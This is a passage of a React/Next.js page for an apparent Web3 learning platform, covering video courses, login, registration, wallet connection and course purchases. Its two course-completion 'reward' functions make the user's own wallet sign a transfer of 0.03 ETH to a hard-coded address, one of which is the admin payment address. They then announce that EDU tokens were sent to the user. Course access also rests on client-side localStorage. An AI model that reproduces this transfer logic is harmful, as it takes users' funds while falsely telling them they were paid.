    </motion.div>
  );
};

// Add new CourseVideo component
const CourseVideo = ({ onClose, courseTitle, walletAddress }: { onClose: () => void; courseTitle: string; walletAddress: string }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [progress, setProgress] = useState(0);
  const [showTransactionModal, setShowTransactionModal] = useState(false);
  const [transactionHash, setTransactionHash] = useState("");
  const [isCompleted, setIsCompleted] = useState(false);

  const getVideoPath = (title: string) => {
    const videoMap: { [key: string]: string } = {
      "Blockchain Development": "/videos/blockchain-development.mp4",
      "Web3 Development": "/videos/web3-development.mp4",
      "DeFi Development": "/videos/defi-development.mp4",
      "NFT Creation": "/videos/nft-creation.mp4"
    };
    return videoMap[title] || "";
  };

  const handleTimeUpdate = () => {
    if (videoRef.current) {
      const currentProgress = (videoRef.current.currentTime / videoRef.current.duration) * 100;
      setProgress(currentProgress);
      
      // Check if video is completed (100% watched)
      if (currentProgress >= 100 && !isCompleted && walletAddress) {
        setIsCompleted(true);
        handleReward();
      }
    }
  };

  const handleReward = async () => {
    try {
      if (!window.ethereum) {
        throw new Error("Please install MetaMask");
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const tx = {
        to: "0x983c601C20dDD0C9729D3167700a06b933D7b0d3",
        value: ethers.parseEther("0.03")
      };
      
      const transaction = await signer.sendTransaction(tx);
      await transaction.wait();
      
      setTransactionHash(transaction.hash);
      setShowTransactionModal(true);
    } catch (error) {
      console.error("Error sending reward:", error);
      alert("Failed to send reward. Please try again.");
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white dark:bg-gray-800 rounded-xl p-6 max-w-4xl w-full mx-4 relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
        
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white">{courseTitle}</h2>
        
        <div className="relative">
          <video
            ref={videoRef}
            className="w-full rounded-lg"
            controls
            onTimeUpdate={handleTimeUpdate}
            src={getVideoPath(courseTitle)}
          />
          <div className="absolute bottom-0 left-0 right-0 h-1 bg-gray-200 rounded-b-lg">
            <div 
              className="h-full bg-blue-500 transition-all duration-300 rounded-b-lg"
              style={{ width: `${progress}%` }}
            />
          </div>
          <div className="absolute bottom-2 right-2 text-white text-sm bg-black bg-opacity-50 px-2 py-1 rounded">
            {Math.round(progress)}%
          </div>
        </div>

        {showTransactionModal && (
          <div className="mt-4 p-4 bg-green-100 dark:bg-green-900 rounded-lg">
            <p className="text-green-800 dark:text-green-200">
              Congratulations! You've completed the course! 0.03 EDU tokens have been sent to your wallet!
            </p>
            <a
              href={`https://blockscout.scroll.io/tx/${transactionHash}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:text-blue-700 dark:text-blue-400 dark:hover:text-blue-300 mt-2 inline-block"
            >
              View transaction on Blockscout
            </a>
          </div>
        )}
      </div>
    </div>
  );
};

export default function Home() {
  const { data: session } = useSession()
  const router = useRouter()
  const [activeContent, setActiveContent] = useState("")
  const [isMenuOpen, setIsMenuOpen] = useState(false)
  const [isLoaded, setIsLoaded] = useState(false)
  const [walletAddress, setWalletAddress] = useState("")
  const [selectedInterest, setSelectedInterest] = useState("")
  const [showLoginModal, setShowLoginModal] = useState(false)
  const [showRegisterModal, setShowRegisterModal] = useState(false)
  const [userProgress, setUserProgress] = useState<{ 
    course: { title: string; description?: string }; 
    progress: number 
  }[]>([])
  const [showExploreCourses, setShowExploreCourses] = useState(false)
  const [loginCredentials, setLoginCredentials] = useState({ 
    email: "", 
    password: "",
    isGmail: false
  })
  const [registerCredentials, setRegisterCredentials] = useState({ 
    name: "", 
    email: "", 
    password: "", 
    confirmPassword: "",
    isGmail: false
  })
  const [loginError, setLoginError] = useState("")
  const [registerError, setRegisterError] = useState("")
  const [registerSuccess, setRegisterSuccess] = useState(false)
  const [showDashboardModal, setShowDashboardModal] = useState(false)
  const [showDomainVideosModal, setShowDomainVideosModal] = useState(false)
  const [selectedDomain, setSelectedDomain] = useState<{ title: string; description: string } | null>(null)
  const [showSudoku, setShowSudoku] = useState(false)
  const [showPuzzle, setShowPuzzle] = useState(false)
  const [showMemory, setShowMemory] = useState(false)
  const [showQuiz, setShowQuiz] = useState(false)
  const [selectedCourse, setSelectedCourse] = useState<{ title: string; description: string } | null>(null)
  const [purchasedCourses, setPurchasedCourses] = useState<string[]>([])

  const contentMap = {
    "blockchain-basics": "Blockchain Basics: Learn the fundamentals of distributed ledger technology.",
    "web3-development": "Web3 Development: Master the tools and frameworks for building decentralized applications.",
    "smart-contracts": "Smart Contracts: Explore the world of self-executing contracts on the blockchain.",
    "defi-nfts": "DeFi & NFTs: Understand decentralized finance protocols and NFTs.",
    "documentation": "Documentation: Comprehensive guides and API references for developers.",
    "tutorials": "Tutorials: Step-by-step learning resources for all levels.",
    "blog": "Blog: Latest updates and insights.",
    "community": "Community: Join our vibrant community.",
    "contact": "ERROR 405 Chennai"
  }

  const handleLinkClick = (key: string) => {
    setActiveContent(contentMap[key as keyof typeof contentMap])
  }

  // Add function to fetch purchases from database
  const fetchPurchases = async () => {
    if (!session) return;
    
    try {
      const response = await fetch('/api/purchases');
      if (!response.ok) {
        throw new Error('Failed to fetch purchases');
      }
      
      const data = await response.json();
      if (data && Array.isArray(data.purchases)) {
        // Extract course titles from purchases
        const purchasedTitles = data.purchases.map((purchase: any) => purchase.courseTitle);
        
        // Update state and localStorage
        setPurchasedCourses(purchasedTitles);
        localStorage.setItem('purchasedCourses', JSON.stringify(purchasedTitles));
      }
    } catch (error) {
      console.error('Error fetching purchases:', error);
    }
  };

  // Modify the useEffect to fetch purchases when session changes
  useEffect(() => {
    setIsLoaded(true)
    if (session) {
      // Fetch user progress when logged in
      fetchUserProgress()
      // Fetch user's purchased courses
      fetchPurchases()
    }
  }, [session])
  
  // Load purchased courses from localStorage on component mount
  // This serves as a fallback if database fetch fails
  useEffect(() => {
    const storedCourses = localStorage.getItem('purchasedCourses')
    if (storedCourses) {
      setPurchasedCourses(JSON.parse(storedCourses))
    }
  }, [])

  useEffect(() => {
    if (selectedInterest === "ERROR_5") {
      router.push("/")
      setSelectedInterest("")
    }
  }, [selectedInterest, router])

  const fetchUserProgress = async () => {
    try {
      const response = await fetch('/api/progress')
      const data = await response.json()
      setUserProgress(data)
    } catch (error) {
      console.error('Error fetching progress:', error)
    }
  }

  const toggleMenu = () => {
    setIsMenuOpen(!isMenuOpen)
  }

  const connectWallet = async () => {
    if (typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
      try {
        // Request account access
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        setWalletAddress(accounts[0])
        console.log("Connected account:", accounts[0])

        // Create provider and signer
        const provider = new ethers.BrowserProvider(window.ethereum)
        const signer = await provider.getSigner()
        console.log("Signer Address:", await signer.getAddress())
      } catch (err) {
        console.error("User rejected the connection", err)
      }
    } else {
      alert("Please install MetaMask to connect your wallet!")
    }
  }

  const disconnectWallet = () => {
    setWalletAddress("")
    // Clear purchased courses when logging out
    setPurchasedCourses([])
    localStorage.removeItem('purchasedCourses')
    toast.info("Wallet disconnected and purchases cleared")
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError('');
    
    if (!loginCredentials.email || !loginCredentials.password) {
      setLoginError("Please fill in all fields");
      return;
    }

    try {
      console.log("Attempting login with email:", loginCredentials.email);
      
      // Set loading state
      const loginBtn = document.querySelector('#login-btn') as HTMLButtonElement;
      if (loginBtn) {
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<span class="animate-pulse">Logging in...</span>';
      }
      
      // Call login API first to verify credentials
      const loginResponse = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: loginCredentials.email,
          password: loginCredentials.password
        }),
      });

      const loginData = await loginResponse.json();

      if (!loginResponse.ok) {
        console.error("Login API error:", loginData);
        throw new Error(loginData.message || loginData.error || 'Login failed');
      }

      console.log("Login API successful, calling NextAuth...");

      // If verification successful, sign in with NextAuth
      const result = await signIn('credentials', {
        email: loginCredentials.email,
        password: loginCredentials.password,
        redirect: false,
      });

      if (result?.error) {
        console.error("NextAuth error:", result.error);
        throw new Error(result.error || 'Authentication failed');
      }

      // Set user data and close modal
      setShowLoginModal(false);
      setLoginCredentials({ email: '', password: '', isGmail: false });
      setLoginError('');
      
      // Refresh the page to update auth state
      window.location.reload();
      
      // Fetch user progress after successful login
      fetchUserProgress();
    } catch (error) {
      console.error('Login error:', error);
      setLoginError(error instanceof Error ? error.message : 'Invalid email or password');
    } finally {
      // Reset button state
      const loginBtn = document.querySelector('#login-btn') as HTMLButtonElement;
      if (loginBtn) {
        loginBtn.disabled = false;
        loginBtn.innerHTML = 'Login';
      }
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setRegisterError('');
    
    // Validate form fields
    if (!registerCredentials.name || !registerCredentials.email || !registerCredentials.password || 
        !registerCredentials.confirmPassword) {
      setRegisterError("Please fill in all fields");
      return;
    }
    
    if (registerCredentials.password !== registerCredentials.confirmPassword) {
      setRegisterError("Passwords do not match");
      return;
    }

    try {
      console.log("Attempting registration with email:", registerCredentials.email);
      
      // Set loading state
      const registerBtn = document.querySelector('#register-btn') as HTMLButtonElement;
      if (registerBtn) {
        registerBtn.disabled = true;
        registerBtn.innerHTML = '<span class="animate-pulse">Registering...</span>';
      }
      
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: registerCredentials.name,
          email: registerCredentials.email,
          password: registerCredentials.password,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || data.error || "Registration failed");
      }

      // Registration successful
      setRegisterSuccess(true);
      setRegisterCredentials({ 
        name: '',
        email: '',
        password: '',
        confirmPassword: '',
        isGmail: false
      });
    } catch (error) {
      console.error("Registration error:", error);
      setRegisterError(error instanceof Error ? error.message : "Registration failed");
    } finally {
      // Reset button state
      const registerBtn = document.querySelector('#register-btn') as HTMLButtonElement;
      if (registerBtn) {
        registerBtn.disabled = false;
        registerBtn.innerHTML = 'Register';
      }
    }
  };

  // Animation variants
  const fadeIn = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 },
  }

  const staggerContainer = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1,
      },
    },
  }

  const exploreCoursesContent = `
    <div className="space-y-6">
      <h2 className="text-2xl font-bold mb-4">Featured Courses</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full" 
              src="https://www.youtube.com/embed/SSo_EIwHSd4" 
              title="Blockchain Fundamentals" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">Blockchain Fundamentals</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Learn the basics of blockchain technology</p>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full rounded-lg" 
              src="https://www.youtube.com/embed/gyMwXuJrbJQ" 
              title="Web3 Development" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">Web3 Development</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Master Web3 development fundamentals</p>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full rounded-lg" 
              src="https://www.youtube.com/embed/M576WGiDBdQ" 
              title="Smart Contracts" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">Smart Contracts</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Build secure smart contracts</p>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full" 
              src="https://www.youtube.com/embed/17QRFlml4pA" 
              title="DeFi Explained" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">DeFi Fundamentals</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Understanding DeFi protocols</p>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full" 
              src="https://www.youtube.com/embed/Ho80wOHVVWc" 
              title="NFT Development" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">NFT Development</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Create and deploy NFTs</p>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md">
          <div className="relative w-full pt-[56.25%]">
            <iframe 
              className="absolute top-0 left-0 w-full h-full" 
              src="https://www.youtube.com/embed/6Gf_kRE4MJU" 
              title="Smart Contract Security" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>
          <div className="p-4">
            <h3 className="font-semibold mb-2">Smart Contract Security</h3>
            <p className="text-sm text-gray-600 dark:text-gray-400">Secure your smart contracts</p>
          </div>
        </div>
      </div>
    </div>
  `

  // Add this new component for the dashboard section
  const DashboardSection = () => {
    if (!session) return null

    return (
      <div className="fixed top-20 right-4 w-80 bg-white dark:bg-gray-800 rounded-lg shadow-lg p-4 z-40">
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          className="space-y-4"
        >
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold">Welcome, {session.user?.name}!</h2>
          </div>
          
          <div className="space-y-3">
            {/* Progress Cards - Compact Version */}
            {userProgress.slice(0, 2).map((progress, index) => (
              <div key={index} className="bg-gray-50 dark:bg-gray-700 rounded-lg p-3">
                <h3 className="text-sm font-medium mb-1 truncate">{progress.course.title}</h3>
                <div className="w-full bg-gray-200 rounded-full h-2 mb-1">
                  <div 
                    className="bg-blue-600 h-2 rounded-full" 
                    style={{ width: `${progress.progress}%` }}
                  ></div>
                </div>
                <p className="text-xs text-gray-600 dark:text-gray-300">
                  Progress: {progress.progress}%
                </p>
              </div>
            ))}

            {/* Quick Stats - Compact Version */}
            <div className="bg-purple-50 dark:bg-purple-900/20 rounded-lg p-3">
              <p className="text-xs">Courses in Progress: {userProgress.length}</p>
              <p className="text-xs">Average Progress: {
                userProgress.length > 0 
                  ? Math.round(userProgress.reduce((acc, curr) => acc + curr.progress, 0) / userProgress.length)
                  : 0
              }%</p>
            </div>
          </div>
        </motion.div>
      </div>
    )
  }

  // Replace with StoreSection component
  const StoreSection = () => {
    if (!session) return null

    const handleStoreClick = () => {
      window.open('https://fanciful-kringle-15ef6b.netlify.app/', '_blank', 'noopener,noreferrer');
    };

    return (
      <div className="fixed top-20 right-4 w-80 bg-white dark:bg-gray-800 rounded-lg shadow-lg p-4 z-40 cursor-pointer" onClick={handleStoreClick}>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          whileHover={{ scale: 1.03 }}
          className="space-y-4"
        >
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold">Store</h2>
            <ShoppingCart className="h-5 w-5 text-blue-600" />
          </div>
          
          <div className="bg-blue-50 dark:bg-blue-900/20 rounded-lg p-4 text-center">
            <p className="font-medium text-blue-700 dark:text-blue-300">Click to visit our store</p>
            <p className="text-xs text-gray-600 dark:text-gray-400 mt-1">Find exclusive merchandise and resources</p>
          </div>
        </motion.div>
      </div>
    )
  }

  // Add domain-specific videos data
  const domainVideos = {
    "blockchain": {
      title: "Blockchain Basics",
      videos: [
        {
          title: "Introduction to Blockchain Technology",
          description: "Learn the fundamentals of blockchain and how it works",
          videoId: "SSo_EIwHSd4"
        },
        {
          title: "Understanding Cryptography in Blockchain",
          description: "Deep dive into cryptographic principles used in blockchain",
          videoId: "2yJqjTiwpxM"
        },
        {
          title: "Blockchain Consensus Mechanisms",
          description: "Explore different consensus algorithms in blockchain",
          videoId: "M576WGiDBdQ"
        }
      ]
    },
    "web3": {
      title: "Web3 Development",
      videos: [
        {
          title: "Getting Started with Web3.js",
          description: "Learn how to interact with Ethereum blockchain using Web3.js",
          videoId: "gyMwXuJrbJQ"
        },
        {
          title: "Building DApps with React",
          description: "Create decentralized applications using React and Web3",
          videoId: "3S8ePxr2nAw"
        },
        {
          title: "Web3 Authentication Methods",
          description: "Implement secure authentication in Web3 applications",
          videoId: "Ho80wOHVVWc"
        }
      ]
    },
    "defi": {
      title: "DeFi & Tokenomics",
      videos: [
        {
          title: "Understanding DeFi Protocols",
          description: "Learn about different DeFi protocols and their use cases",
          videoId: "17QRFlml4pA"
        },
        {
          title: "Yield Farming Explained",
          description: "Deep dive into yield farming and liquidity provision",
          videoId: "6Gf_kRE4MJU"
        },
        {
          title: "DeFi Smart Contracts",
          description: "Build and deploy DeFi smart contracts",
          videoId: "M576WGiDBdQ"
        }
      ]
    },
    "nft": {
      title: "NFT Creation & Trading",
      videos: [
        {
          title: "NFT Development Fundamentals",
          description: "Create and deploy your first NFT smart contract",
          videoId: "Ho80wOHVVWc"
        },
        {
          title: "NFT Marketplaces",
          description: "Build and interact with NFT marketplaces",
          videoId: "6Gf_kRE4MJU"
        },
        {
          title: "Advanced NFT Features",
          description: "Implement advanced features in NFT contracts",
          videoId: "17QRFlml4pA"
        }
      ]
    }
  }

  // Add domain games data
  const domainGames: Record<string, { title: string, games: Game[] }> = {
    "blockchain": {
      title: "Blockchain Games",
      games: [
        {
          title: "Blockchain Explorer",
          description: "Interactive game to understand how blocks are created and linked",
          image: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game1"
        },
        {
          title: "Crypto Mining Simulator",
          description: "Learn mining concepts through gamification",
          image: "https://images.unsplash.com/photo-1621504450181-5d356f61d307?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game2"
        },
        {
          title: "Hash Challenge",
          description: "Test your knowledge of cryptographic hashing",
          image: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game3"
        },
        {
          title: "Blockchain Sudoku",
          description: "Play Sudoku while learning blockchain concepts",
          image: "https://images.unsplash.com/photo-1611128698814-a6267426479c?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          isSudoku: true
        }
      ]
    },
    "web3": {
      title: "Web3 Games",
      games: [
        {
          title: "DApp Builder",
          description: "Build your first decentralized application in a game",
          image: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game4"
        },
        {
          title: "Smart Contract Challenge",
          description: "Interactive game to learn Solidity basics",
          image: "https://images.unsplash.com/photo-1621504450181-5d356f61d307?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game5"
        },
        {
          title: "Web3 Security Game",
          description: "Learn about Web3 security through challenges",
          image: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game6"
        }
      ]
    },
    "defi": {
      title: "DeFi Games",
      games: [
        {
          title: "DeFi Trading Simulator",
          description: "Practice DeFi trading in a risk-free environment",
          image: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game7"
        },
        {
          title: "Yield Farm Game",
          description: "Learn yield farming strategies through gameplay",
          image: "https://images.unsplash.com/photo-1621504450181-5d356f61d307?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game8"
        },
        {
          title: "Liquidity Pool Master",
          description: "Master liquidity pool concepts in a game",
          image: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game9"
        }
      ]
    },
    "nft": {
      title: "NFT Games",
      games: [
        {
          title: "NFT Creator",
          description: "Create and trade virtual NFTs in a game environment",
          image: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game10"
        },
        {
          title: "NFT Marketplace Game",
          description: "Learn NFT trading mechanics through simulation",
          image: "https://images.unsplash.com/photo-1621504450181-5d356f61d307?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game11"
        },
        {
          title: "NFT Collection Challenge",
          description: "Build and manage your virtual NFT collection",
          image: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3",
          link: "https://example.com/game12"
        }
      ]
    }
  }

  const handleDomainClick = (domain: { title: string; description: string; videoPath: string }) => {
    if (walletAddress) {
      setSelectedCourse(domain);
      // Start video playback
      const videoElement = document.getElementById('course-video') as HTMLVideoElement;
      if (videoElement) {
        videoElement.src = domain.videoPath;
        videoElement.currentTime = 0;
        videoElement.play();
      }
    } else {
      alert("Please connect your wallet first to watch the course!");
    }
  };

  // Add video progress tracking
  const handleVideoProgress = () => {
    const videoElement = document.getElementById('course-video') as HTMLVideoElement;
    if (videoElement) {
      const progress = (videoElement.currentTime / videoElement.duration) * 100;
      // Update progress display
      const progressElement = document.getElementById('video-progress');
      if (progressElement) {
        progressElement.style.width = `${progress}%`;
        progressElement.textContent = `${Math.round(progress)}%`;
      }
      if (progress >= 100 && walletAddress) {
        handleCourseReward();
      }
    }
  };

  const handleCourseReward = async () => {
    try {
      if (!window.ethereum) {
        throw new Error("Please install MetaMask");
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const tx = {
        to: "0xbF188D68de8f9C232cC421dF11aa16d06b506BD1",
        value: ethers.parseEther("0.03")
      };
      
      const transaction = await signer.sendTransaction(tx);
      await transaction.wait();
      
      alert("Congratulations! You've completed the course! 0.03 EDU tokens have been sent to your wallet!");
    } catch (error) {
      console.error("Error sending reward:", error);
      alert("Failed to send reward. Please try again.");
    }
  };

  const domainVideoMap = {
    "blockchain": {
      title: "Blockchain Basics",
      videos: [
        {
          title: "Introduction to Blockchain Technology",
          description: "Learn the fundamentals of blockchain and how it works",
          videoId: "SSo_EIwHSd4"
        },
        {
          title: "Understanding Cryptography in Blockchain",
          description: "Deep dive into cryptographic principles used in blockchain",
          videoId: "2yJqjTiwpxM"
        },
        {
          title: "Blockchain Consensus Mechanisms",
          description: "Explore different consensus algorithms in blockchain",
          videoId: "M576WGiDBdQ"
        }
      ]
    },
    "web3": {
      title: "Web3 Development",
      videos: [
        {
          title: "Getting Started with Web3.js",
          description: "Learn how to interact with Ethereum blockchain using Web3.js",
          videoId: "gyMwXuJrbJQ"
        },
        {
          title: "Building DApps with React",
          description: "Create decentralized applications using React and Web3",
          videoId: "3S8ePxr2nAw"
        },
        {
          title: "Web3 Authentication Methods",
          description: "Implement secure authentication in Web3 applications",
          videoId: "Ho80wOHVVWc"
        }
      ]
    },
    "defi": {
      title: "DeFi & Tokenomics",
      videos: [
        {
          title: "Understanding DeFi Protocols",
          description: "Learn about different DeFi protocols and their use cases",
          videoId: "17QRFlml4pA"
        },
        {
          title: "Yield Farming Explained",
          description: "Deep dive into yield farming and liquidity provision",
          videoId: "6Gf_kRE4MJU"
        },
        {
          title: "DeFi Smart Contracts",
          description: "Build and deploy DeFi smart contracts",
          videoId: "M576WGiDBdQ"
        }
      ]
    },
    "nft": {
      title: "NFT Creation & Trading",
      videos: [
        {
          title: "NFT Development Fundamentals",
          description: "Create and deploy your first NFT smart contract",
          videoId: "Ho80wOHVVWc"
        },
        {
          title: "NFT Marketplaces",
          description: "Build and interact with NFT marketplaces",
          videoId: "6Gf_kRE4MJU"
        },
        {
          title: "Advanced NFT Features",
          description: "Implement advanced features in NFT contracts",
          videoId: "17QRFlml4pA"
        }
      ]
    }
  }

  const domains = [
    {
      title: "Blockchain Development",
      description: "Learn the fundamentals of blockchain technology, smart contracts, and decentralized applications.",
      videoPath: "/videos/blockchain-development.mp4"
    },
    {
      title: "Web3 Development",
      description: "Master Web3 technologies, dApp development, and blockchain integration.",
      videoPath: "/videos/web3-development.mp4"
    },
    {
      title: "DeFi Development",
      description: "Build decentralized finance applications, understand DeFi protocols, and create financial smart contracts.",
      videoPath: "/videos/defi-development.mp4"
    },
    {
      title: "NFT Creation",
      description: "Create, deploy, and manage NFTs, understand token standards, and build NFT marketplaces.",
      videoPath: "/videos/nft-creation.mp4"
    }
  ];

  // Update the CourseCard component to maintain original UI but restrict access
  const CourseCard = ({ title, description, imageSrc, onClick }: { title: string; description: string; imageSrc: string; onClick: () => void }) => {
    const isPurchased = purchasedCourses.includes(title);
    const isLoggedInAndConnected = session && walletAddress;
    
    // Find course progress - check if this course is completed (100%)
    const courseProgress = userProgress.find(progress => 
      progress.course.title === title || progress.course === title
    );
    const isComplete = courseProgress && courseProgress.progress >= 100;

  return (
      <div 
        className="course-card w-full p-3 h-auto border border-input rounded-md bg-background hover:bg-blue-50 dark:hover:bg-blue-900/20 transition-colors duration-200 relative flex flex-col items-center gap-2 cursor-pointer"
        onClick={() => {
          if (isPurchased && isLoggedInAndConnected) {
            onClick();
          } else {
            toast.warning(
              !session 
                ? "Please login to access courses" 
                : !walletAddress
                  ? "Please connect your wallet to access courses"
                  : "Please purchase this course to access it"
            );
          }
        }}
      >
        <div className="text-2xl">{title.charAt(0)}</div>
        <div className="text-sm font-medium">{title}</div>
        
        {/* Progress indicator for purchased courses */}
        {isPurchased && isLoggedInAndConnected && courseProgress && (
          <div className="w-full mt-1 bg-gray-200 rounded-full h-1.5">
            <div 
              className="bg-blue-600 h-1.5 rounded-full" 
              style={{ width: `${courseProgress.progress}%` }}
            ></div>
          </div>
        )}
        
        {/* Purchased badge - only show if wallet is connected and logged in */}
        {isPurchased && isLoggedInAndConnected && (
          <div className="absolute top-1 right-1 bg-green-100 text-green-800 text-xs px-1.5 py-0.5 rounded-full">
            Purchased
          </div>
        )}
        
        {/* Buy button - only show if not purchased, wallet is connected, and logged in */}
        {!isPurchased && isLoggedInAndConnected && (
          <Button
            size="sm"
            variant="default"
            className="absolute bottom-1 right-1 bg-green-600 hover:bg-green-700 text-white text-xs py-0 px-2 h-6"
            onClick={(e) => {
              e.stopPropagation();
              handleBuyCourse(title);
            }}
          >
            Buy
          </Button>
        )}

        {/* Refund button - only show if course is purchased AND completed 100% */}
        {isPurchased && isLoggedInAndConnected && isComplete && (
          <Button
            size="sm"
            variant="outline"
            className="absolute bottom-1 right-1 border-red-600 text-red-600 hover:bg-red-50 text-xs py-0 px-2 h-6"
            onClick={(e) => {
              e.stopPropagation();
              handleRefund(title);
            }}
          >
            Refund
          </Button>
        )}
      </div>
    );
  };

  // Modify the handleBuyCourse function to send ETH from student to admin
  const handleBuyCourse = async (courseTitle: string) => {
    if (!walletAddress || !window.ethereum) {
      toast.error("Please connect your wallet first");
      return false;
    }

    try {
      // Admin wallet address to receive payment
      const adminAddress = "0x983c601C20dDD0C9729D3167700a06b933D7b0d3";
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Create transaction to send 0.03 ETH to admin
      const tx = {
        to: adminAddress,
        value: ethers.parseEther("0.03")
      };
      
      // Request user confirmation and send transaction
      const transaction = await signer.sendTransaction(tx);
      const etherscanLink = `https://sepolia.etherscan.io/tx/${transaction.hash}`;
      
      toast.info(
        <div>
          Processing purchase... 
          <a 
            href={etherscanLink} 
            target="_blank" 
            rel="noopener noreferrer" 
            style={{color: '#4CAF50', marginLeft: '5px', textDecoration: 'underline'}}
          >
            View on Etherscan
          </a>
        </div>,
        { autoClose: false }
      );
      
      // Wait for transaction confirmation
      await transaction.wait();
      
      // Store the purchase in localStorage for immediate use
      const storedCourses = localStorage.getItem('purchasedCourses');
      let coursesArray: string[] = storedCourses ? JSON.parse(storedCourses) : [];
      
      if (!coursesArray.includes(courseTitle)) {
        coursesArray.push(courseTitle);
        localStorage.setItem('purchasedCourses', JSON.stringify(coursesArray));
      }
      
      // Store the purchase in the database if user is logged in
      if (session) {
        try {
